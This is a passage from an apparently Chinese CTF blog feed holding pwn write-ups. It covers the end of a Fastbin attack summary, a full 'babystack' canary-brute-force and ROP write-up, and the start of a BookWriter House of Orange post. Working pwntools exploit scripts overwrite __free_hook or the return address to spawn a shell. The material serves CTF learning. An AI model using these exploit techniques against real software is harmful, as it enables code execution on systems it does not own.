class="number">0x58</span></span><br><span class="line">main_arena_offset = <span class="number">0x3c3b20</span></span><br><span class="line">system_offset = libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">__free_hook_offset = libc.symbols[<span class="string">"__free_hook"</span>]</span><br><span class="line"><span class="comment"># realloc_offset = libc.symbols["realloc"]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># unlink and chunk overlap</span></span><br><span class="line">add(<span class="number">0xF8</span>, <span class="string">"AAAA"</span>, <span class="string">"AAAA"</span>) <span class="comment"># chunk 0</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">"BBBB"</span>, <span class="string">"BBBB"</span>) <span class="comment"># chunk 1</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">"CCCC"</span>, <span class="string">"CCCC"</span>) <span class="comment"># chunk 2</span></span><br><span class="line">add(<span class="number">0xF8</span>, <span class="string">"DDDD"</span>, <span class="string">"DDDD"</span>) <span class="comment"># chunk 3</span></span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">"EEEE"</span>, <span class="string">"EEEE"</span>) <span class="comment"># chunk 4</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">"CCCC"</span>, <span class="string">"C"</span> * <span class="number">0x20</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p64(<span class="number">0x180</span>)) <span class="comment"># chunk 2</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">add(<span class="number">0xF8</span>, <span class="string">"AAAA"</span>, <span class="string">"AAAA"</span>) <span class="comment"># chunk 0</span></span><br><span class="line">view(<span class="number">1</span>, <span class="string">"Secret : "</span>)</span><br><span class="line">main_arena = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">"\x00"</span>))</span><br><span class="line">libc_base = main_arena - unsorted_bin_offset - main_arena_offset</span><br><span class="line">__free_hook = libc_base + __free_hook_offset</span><br><span class="line">libc_system = libc_base + system_offset</span><br><span class="line"></span><br><span class="line"><span class="comment"># recover the unsorted bin</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># chunk overlap</span></span><br><span class="line">add(<span class="number">0xE8</span>, <span class="string">"AAAA"</span>, <span class="string">"AAAA"</span>) <span class="comment"># chunk 0</span></span><br><span class="line">add(<span class="number">0xF8</span>, <span class="string">"DDDD"</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x61</span>) + <span class="string">"D"</span> * <span class="number">0x58</span> + p64(<span class="number">0x21</span>)) <span class="comment"># chunk 3</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># chunk overlap again</span></span><br><span class="line">add(<span class="number">0xF8</span>, <span class="string">"BBBB"</span>, <span class="string">"B"</span> * <span class="number">0x48</span> + p64(<span class="number">0x71</span>) + <span class="string">"B"</span> * <span class="number">0x68</span> + p64(<span class="number">0x21</span>)) <span class="comment"># chunk 1</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># unsorted bin attack</span></span><br><span class="line">add(<span class="number">0x98</span>, <span class="string">"BBBB"</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x61</span>) + <span class="string">"B"</span> * <span class="number">0x30</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>)) <span class="comment"># chunk 1</span></span><br><span class="line">add(<span class="number">0x58</span>, <span class="string">"CCCC"</span>, <span class="string">"\x00"</span> * <span class="number">0x30</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>) + p64(__free_hook - <span class="number">0x43</span>)) <span class="comment"># chunk 2</span></span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">"DDDD"</span>, <span class="string">"\x00"</span> * <span class="number">0x40</span> + p64(<span class="number">0</span>) + p64(<span class="number">0xA1</span>) + p64(main_arena) + p64(__free_hook - <span class="number">0x50</span>)) <span class="comment"># chunk 3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># trigger unsorted bin attack</span></span><br><span class="line">add(<span class="number">0x98</span>, <span class="string">"EEEE"</span>, <span class="string">"EEEE"</span>) <span class="comment"># chunk 4</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># write __free_hook</span></span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">"FFFF"</span>, <span class="string">"\x00"</span> * <span class="number">0x33</span> + p64(libc_system)) <span class="comment"># chunk 5</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># trigger __free_hook</span></span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">"GGGG"</span>, <span class="string">"/bin/sh\x00"</span>) <span class="comment"># chunk 6</span></span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">success(<span class="string">"libc_base: "</span> + hex(libc_base))</span><br><span class="line">success(<span class="string">"libc_system: "</span> + hex(libc_system))</span><br><span class="line">success(<span class="string">"__free_hook: "</span> + hex(__free_hook))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li></ol><h2 id="write-IO-FILE-vtable"><a href="#write-IO-FILE-vtable" class="headerlink" title="write _IO_FILE vtable"></a>write _IO_FILE vtable</h2><p>这个还没有接触到过，也没有自己实现过，待补充。</p><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><ul><li>之前确实有碰到过<code>__malloc_hook</code>改onegadget一次打不通的情况，但是都是通过<code>realloc</code>调整实现的（还以为通用了，结果打脸了），这次好几道题都没办法用这种办法实现，所以学习了一波。</li><li>确实没有遇到过改top chunk的利用方法，这次算是学到了。</li><li><code>__free_hook</code>还是比<code>__malloc_hook</code>稳，onegadget的约束有的时候真的是太难满足了。</li><li>发现两道利用<code>malloc_printerr</code>触发<code>__malloc_hook</code>的从而onegadget来getshell的题目，都是用的<code>[rsp+0x50]==NULL</code>这个约束，是小概率还是大概率还是必然？</li></ul><h1 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h1><ol><li><a href="https://bbs.pediy.com/thread-225973.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-225973.htm</a></li><li><a href="https://xuanxuanblingbling.github.io/ctf/pwn/2020/03/21/garden/" target="_blank" rel="noopener">https://xuanxuanblingbling.github.io/ctf/pwn/2020/03/21/garden/</a></li><li><a href="https://www.anquanke.com/post/id/171283#h2-0" target="_blank" rel="noopener">https://www.anquanke.com/post/id/171283#h2-0</a></li><li><a href="https://bbs.pediy.com/thread-230028.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-230028.htm</a></li><li><a href="https://elixir.bootlin.com/glibc/glibc-2.23/source" target="_blank" rel="noopener">https://elixir.bootlin.com/glibc/glibc-2.23/source</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这几天刷了四道题，巧了都是Fastbin attack，本来惯用的套路是直接onegadget打&lt;code&gt;__malloc_hook&lt;/code&gt;，然后所有onegadget都打不通的情况也很常见，我之前所知道的仅仅局限于&lt;code&gt;__realloc_hook&lt;/code&gt;和&lt;code&gt;__malloc_hook&lt;/code&gt;的联合使用来调整堆栈，但是也有一定的局限性，这次结合pwnable.tw上的几道题以及CTFhub上收录的CISCN 2019的一道题，小小地总结一下Fastbin attack的一些套路。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Writeup" scheme="https://n0nop.github.io/categories/Writeup/"/>
    
      <category term="Summary" scheme="https://n0nop.github.io/categories/Writeup/Summary/"/>
    
    
      <category term="CTF" scheme="https://n0nop.github.io/tags/CTF/"/>
    
      <category term="pwn" scheme="https://n0nop.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>pwn rop: babystack</title>
    <link href="https://n0nop.github.io/2020/04/09/pwn-rop-babystack/"/>
    <id>https://n0nop.github.io/2020/04/09/pwn-rop-babystack/</id>
    <published>2020-04-09T12:32:17.000Z</published>
    <updated>2020-04-09T12:58:15.140Z</updated>
    
    <content type="html"><![CDATA[<p>其实挺简单的一个rop题目，本来不想写这个wp，感觉没必要，因为除了爆破就是爆破，还爆了十多分钟。但是因为不想直接one_gadget还想了有一段时间怎么写rop，最后还是写出来了，成功打通，索性记录一下。</p><a id="more"></a><h1 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h1><p>x64程序，保护全开：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br><span class="line">FORTIFY:  Enabled</span><br></pre></td></tr></table></figure><p>就两个功能，一个<code>login</code>，要求输入password比较通过后才能开启<code>copy</code>功能：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">fastcall <span class="title">login</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> v1; <span class="comment">// rax</span></span><br><span class="line">    <span class="keyword">char</span> s; <span class="comment">// [rsp+10h] [rbp-80h]</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Your passowrd :"</span>);</span><br><span class="line">    get_input((<span class="keyword">unsigned</span> __int8 *)&amp;s, <span class="number">0x7F</span>u);</span><br><span class="line">    v1 = <span class="built_in">strlen</span>(&amp;s);</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strncmp</span>(&amp;s, a1, v1) )</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Failed !"</span>);</span><br><span class="line">    login_state = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Login Success !"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>copy</code>功能，顾名思义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">fastcall <span class="title">copy</span><span class="params">(<span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> src; <span class="comment">// [rsp+10h] [rbp-80h]</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Copy :"</span>);</span><br><span class="line">    get_input((<span class="keyword">unsigned</span> __int8 *)&amp;src, <span class="number">0x3F</span>u);</span><br><span class="line">    <span class="built_in">strcpy</span>(a1, &amp;src);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"It is magic copy !"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对应<code>main</code>函数中的变量来看，这个<code>copy</code>其实就是往<code>v6</code>进行copy：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">_QWORD *v3; <span class="comment">// rcx</span></span><br><span class="line">__int64 v4; <span class="comment">// rdx</span></span><br><span class="line"><span class="keyword">char</span> v6; <span class="comment">// [rsp+0h] [rbp-60h]</span></span><br><span class="line">__int64 buf; <span class="comment">// [rsp+40h] [rbp-20h]</span></span><br><span class="line">__int64 v8; <span class="comment">// [rsp+48h] [rbp-18h]</span></span><br><span class="line"><span class="keyword">char</span> v9; <span class="comment">// [rsp+50h] [rbp-10h]</span></span><br></pre></td></tr></table></figure><h1 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h1><ul><li><code>login</code>的局部变量<code>s</code>和<code>copy</code>的局部变量<code>v6</code>共享栈空间，但是<code>s</code>可以写入0x7F字节，因此<code>strcpy(a1, &amp;src);</code>这里就可以造成<code>copy</code>的参数<code>a1</code>其实也就是<code>main</code>里面的局部变量<code>v6</code>的溢出。</li><li>再者由于它<code>login</code>的比较逻辑如下，显然这个<code>v1</code>是很容易控制的，那么就可以用来逐字节爆破栈上的东西，这样libc，PIE，以及0x10字节的canary都可以有。因为这里我是想不用one_gadget，那么就必须要得到PIE来写gadgets控rdi（<del>其实就是比one_gadget复杂，但我就是想试试rop</del>）。  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">v1 = <span class="built_in">strlen</span>(&amp;s);</span><br><span class="line"><span class="keyword">if</span> ( <span class="built_in">strncmp</span>(&amp;s, a1, v1) )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Failed !"</span>);</span><br></pre></td></tr></table></figure></li><li>写rop的时候还有坑点，就是这里的溢出是通过<code>strcpy</code>来完成的，它遇到”\x00”就会停止，但是因为从来就没有从<code>main</code>返回过，所以可以分几步写，而且注意必须从高地址往低地址逐个写，不然低地址的gadgets就会被高地址写的时候给覆盖了。另外因为gadgets以及str_bin_sh的地址高两字节都是”\x00”，所以这里还要逐个地把高字节清零（写高地址gadgets的时候残留的）。这样说可能理解起来比较困难，可以自己调试一下就能发现问题了。</li><li>rop写完，直接返回，shell到手。（亲测有效，但是时间有点长）</li></ul><h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><p>这里exp是我尝试one_gadget的，本地成功了，rop的部分被我注释掉了，远程打通过了。把注释标有one_gadget的部分注释掉，标有rop的取消掉就能跑rop的攻击方法了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># context.log_level = "debug"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(state, password=<span class="string">""</span>)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">"1"</span>)</span><br><span class="line">    <span class="keyword">if</span> state == <span class="number">1</span>:</span><br><span class="line">        p.sendafter(<span class="string">"Your passowrd :"</span>, password)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">copy</span><span class="params">(content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">"3"</span>)</span><br><span class="line">    p.sendafter(<span class="string">"Copy :"</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">quit</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">"2"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bruteforce</span><span class="params">(init, nbytes, half_bytes=True)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> init != <span class="string">""</span> <span class="keyword">and</span> half_bytes == <span class="literal">True</span>:</span><br><span class="line">        addr = init[:<span class="number">-1</span>]</span><br><span class="line">        half_bytes = ord(init[<span class="number">-1</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        addr = init</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(nbytes):</span><br><span class="line">        print(len(addr))</span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">0</span> <span class="keyword">and</span> half_bytes == <span class="literal">True</span>:</span><br><span class="line">            print(i)</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">0x10</span>):</span><br><span class="line">                payload = addr + chr((j &lt;&lt; <span class="number">4</span>) | half_bytes) + <span class="string">"\x00"</span></span><br><span class="line">                login(<span class="number">1</span>, payload)</span><br><span class="line">                <span class="keyword">if</span> p.recv(<span class="number">8</span>) != <span class="string">"Failed !"</span>:</span><br><span class="line">                    addr += chr((j &lt;&lt; <span class="number">4</span>) | half_bytes)</span><br><span class="line">                    login(<span class="number">0</span>)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">0x100</span>):</span><br><span class="line">                payload = addr + chr(j) + <span class="string">"\x00"</span></span><br><span class="line">                login(<span class="number">1</span>, payload)</span><br><span class="line">                <span class="keyword">if</span> p.recv(<span class="number">8</span>) != <span class="string">"Failed !"</span>:</span><br><span class="line">                    addr += chr(j)</span><br><span class="line">                    login(<span class="number">0</span>)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> addr</span><br><span class="line"></span><br><span class="line">main = <span class="number">0xecf</span></span><br><span class="line">pop_rdi = <span class="number">0x00000000000010c3</span> <span class="comment"># pop rdi ; ret</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x00000000000010c1</span> <span class="comment"># pop rsi ; pop r15 ; ret</span></span><br><span class="line">system_offset = libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">str_bin_sh_offset = libc.search(<span class="string">"/bin/sh"</span>).next()</span><br><span class="line">one_gadget_offset = <span class="number">0xf0567</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># brute force the canary</span></span><br><span class="line">canary = bruteforce(<span class="string">""</span>, <span class="number">0x10</span>, <span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># brute force done</span></span><br><span class="line">success(<span class="string">"Canary leak done!"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># # if write rop chain, then will need the PIE</span></span><br><span class="line"><span class="comment"># # again brute force the PIE</span></span><br><span class="line"><span class="comment"># login(1, "\x00".ljust(0x40, "A"))</span></span><br><span class="line"><span class="comment"># copy("BBBB")</span></span><br><span class="line"><span class="comment"># login(0)</span></span><br><span class="line"><span class="comment"># PIE_related = u64(bruteforce("\x70\x0b", 6).ljust(8, "\x00"))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # brute force done</span></span><br><span class="line"><span class="comment"># PIE = PIE_related - 0xb70</span></span><br><span class="line"><span class="comment"># PIE_main = PIE + main</span></span><br><span class="line"><span class="comment"># PIE_pop_rsi_r15 = PIE + pop_rsi_r15</span></span><br><span class="line"><span class="comment"># PIE_pop_rdi = PIE + pop_rdi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># finally brute force the libc</span></span><br><span class="line">login(<span class="number">1</span>, <span class="string">"\x00"</span>.ljust(<span class="number">0x48</span>, <span class="string">"A"</span>))</span><br><span class="line">copy(<span class="string">"BBBB"</span>)</span><br><span class="line">login(<span class="number">0</span>)</span><br><span class="line">libc_related = u64(bruteforce(<span class="string">"A"</span> * <span class="number">8</span> + <span class="string">"\x39\x04"</span>, <span class="number">6</span>)[<span class="number">8</span>:].ljust(<span class="number">8</span>, <span class="string">"\x00"</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># brute force done</span></span><br><span class="line">libc_base = libc_related - <span class="number">0x78439</span></span><br><span class="line">libc_system = libc_base + system_offset</span><br><span class="line">str_bin_sh = libc_base + str_bin_sh_offset</span><br><span class="line"></span><br><span class="line"><span class="comment"># one_gagdet</span></span><br><span class="line">one_gadget = libc_base + one_gadget_offset</span><br><span class="line">payload = <span class="string">"\x00"</span>.ljust(<span class="number">0x40</span>, <span class="string">"C"</span>)</span><br><span class="line">payload += canary</span><br><span class="line">payload = payload.ljust(<span class="number">0x60</span>, <span class="string">"C"</span>)</span><br><span class="line">payload += flat([<span class="number">0xdeadbeefbeefdead</span>, one_gadget])</span><br><span class="line">login(<span class="number">1</span>, payload)</span><br><span class="line">copy(<span class="string">"D"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># # write rop ==&gt; system("/bin/sh")</span></span><br><span class="line"><span class="comment"># # write libc_system first</span></span><br><span class="line"><span class="comment"># payload = "\x00".ljust(0x78, "C")</span></span><br><span class="line"><span class="comment"># payload += flat(([libc_system]))[:-1]</span></span><br><span class="line"><span class="comment"># login(1, payload)</span></span><br><span class="line"><span class="comment"># copy("D")</span></span><br><span class="line"><span class="comment"># login(0)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # then write bin_sh address</span></span><br><span class="line"><span class="comment"># payload = "\x00".ljust(0x70, "C")</span></span><br><span class="line"><span class="comment"># payload += flat(([str_bin_sh]))[:-2] + "C\x00"</span></span><br><span class="line"><span class="comment"># login(1, payload)</span></span><br><span class="line"><span class="comment"># copy("D")</span></span><br><span class="line"><span class="comment"># login(0)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = "\x00".ljust(0x70, "C")</span></span><br><span class="line"><span class="comment"># payload += flat(([str_bin_sh]))</span></span><br><span class="line"><span class="comment"># login(1, payload)</span></span><br><span class="line"><span class="comment"># copy("D")</span></span><br><span class="line"><span class="comment"># login(0)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # then write pop_rdi gadget</span></span><br><span class="line"><span class="comment"># # keep the canary</span></span><br><span class="line"><span class="comment"># payload = "\x00".ljust(0x60, "C")</span></span><br><span class="line"><span class="comment"># payload += flat([0xdeadbeefbeefdead, PIE_pop_rdi])[:-2] + "C\x00"</span></span><br><span class="line"><span class="comment"># login(1, payload)</span></span><br><span class="line"><span class="comment"># copy("D")</span></span><br><span class="line"><span class="comment"># login(0)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = "\x00".ljust(0x40, "C")</span></span><br><span class="line"><span class="comment"># payload += canary</span></span><br><span class="line"><span class="comment"># payload = payload.ljust(0x60, "C")</span></span><br><span class="line"><span class="comment"># payload += flat([0xdeadbeefbeefdead, PIE_pop_rdi])</span></span><br><span class="line"><span class="comment"># login(1, payload)</span></span><br><span class="line"><span class="comment"># copy("D")</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># exit</span></span><br><span class="line">quit()</span><br><span class="line"></span><br><span class="line"><span class="comment"># success("PIE_related: " + hex(PIE_related))</span></span><br><span class="line"><span class="comment"># success("PIE: " + hex(PIE))</span></span><br><span class="line">success(<span class="string">"libc_related: "</span> + hex(libc_related))</span><br><span class="line">success(<span class="string">"libc_base: "</span> + hex(libc_base))</span><br><span class="line">success(<span class="string">"libc_system: "</span> + hex(libc_system))</span><br><span class="line">success(<span class="string">"str_bin_sh: "</span> + hex(str_bin_sh))</span><br><span class="line">success(<span class="string">"one_gadget: "</span> + hex(one_gadget))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><ul><li>没啥好小结的，就是普通的rop，只不过爆破时间挺长。</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;其实挺简单的一个rop题目，本来不想写这个wp，感觉没必要，因为除了爆破就是爆破，还爆了十多分钟。但是因为不想直接one_gadget还想了有一段时间怎么写rop，最后还是写出来了，成功打通，索性记录一下。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Writeup" scheme="https://n0nop.github.io/categories/Writeup/"/>
    
    
      <category term="CTF" scheme="https://n0nop.github.io/tags/CTF/"/>
    
      <category term="pwn" scheme="https://n0nop.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>pwn heap: BookWriter</title>
    <link href="https://n0nop.github.io/2020/04/09/pwn-heap-BookWriter/"/>
    <id>https://n0nop.github.io/2020/04/09/pwn-heap-BookWriter/</id>
    <published>2020-04-09T01:52:44.000Z</published>
    <updated>2020-12-03T03:39:37.397Z</updated>
    
    <content type="html"><![CDATA[<p>典型的House of orange + unsorted bin attack + _IO_FILE，之前在<a href="https://n0nop.com/2020/02/07/pwn-heap-melody-center/" target="_blank" rel="noopener">melody_center</a>中有写过，基本是一样的，除了一些利用的细节。权当是练习了，毕竟第一次接触的时候，写起来有点吃力。</p><a id="more"></a><h1 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h1><p>x64程序，保护除了<code>PIE</code>全开：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br><span class="line">FORTIFY:  Enabled</span><br></pre></td></tr></table></figure><p>题目提供了五个功能：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">----------------------</span><br><span class="line">      BookWriter      </span><br><span class="line">----------------------</span><br><span class="line"> 1. Add a page        </span><br><span class="line"> 2. View a page       </span><br><span class="line"> 3. Edit a page       </span><br><span class="line"> 4. Information       </span><br><span class="line"> 5. Exit              </span><br><span class="line">----------------------</span><br></pre></td></tr></table></figure><p>最开始的时候会要求输入author name。<br><br><code>add</code>功能就是添加一个page，地址和大小分别存在bss上两个数组里面。<br><br><code>view</code>功能就是输出一个给定page的内容。<br><br><code>edit</code>功能就是修改一个给定page的内容，但是这里会重新根据<code>strlen(content)</code>来修改之前提到的bss上存大小的数组里，从而影响下一次可以读入的字节数。<br><br><code>info</code>功能就是输出author name, page数量，以及提供更改author name的选择。</p><h1 id="相关知识点"><a href="#相关知识点" class="headerlink" title="相关知识点"></a>相关知识点</h1><h2 id="House-of-orange"><a href="#House-of-orange" class="headerlink" title="House of orange"></a>House of orange</h2><p>House of orange攻击的核心，就是在没有free函数的情况下，释放出一个unsorted bin供利用，而主要的原理就是利用top chunk。<br><br>一般在可以overwrite top chunk size的情况下，请求malloc一个比伪造的top chunk 